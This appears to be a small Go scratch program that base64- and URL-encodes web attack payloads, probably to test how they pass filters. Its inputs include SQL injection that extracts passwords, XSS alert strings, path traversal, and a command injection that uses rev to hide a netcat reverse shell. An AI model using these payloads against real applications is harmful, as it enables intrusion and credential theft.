package main

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"
)

func base64Encode(data string) {
	base64Encoded := base64.StdEncoding.EncodeToString([]byte(data))

	base64EncodedFlat := strings.ReplaceAll(base64Encoded, "=", "")

	fmt.Printf("Base64 encoded    : [%s] len: %d\n", base64Encoded, len(base64Encoded))
	fmt.Printf("Base64Flat encoded: [%s] len: %d\n", base64EncodedFlat, len(base64EncodedFlat))
}

func urlEncode(data string) {
	urlEncoded := url.QueryEscape(data)

	fmt.Printf("URL encoded       : [%s] len: %d\n", urlEncoded, len(urlEncoded))
}

func main() {
	fmt.Println("╔══════════════════════════════════╗")
	fmt.Println("║ Tests on encoders used in golang ║")
	fmt.Println("╚══════════════════════════════════╝")

	// urlEncode("' UNION SELECT username || '':'' || password FROM users")

	// base64Encode("<b onmouseover=alert('Wufff!')>click me!<")
	// base64Encode("<b onmouseover=alert('Wufff!')>click me!</")
	// base64Encode("<b onmouseover=alert('Wufff!')>click me!</b")
	// base64Encode("<b onmouseover=alert('Wufff!')>click me!</b>")
	// base64Encode("\\'-alert(1)//")
	urlEncode("0x2f?.%%32E0x2e0x5c")
	urlEncode(";$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)")

	urlEncode("<script>alert('union select password from users')</script>")
	base64Encode("%3Cscript%3Ealert%28%27union+select+password+from+users%27%29%3C%2Fscript%3E")
}
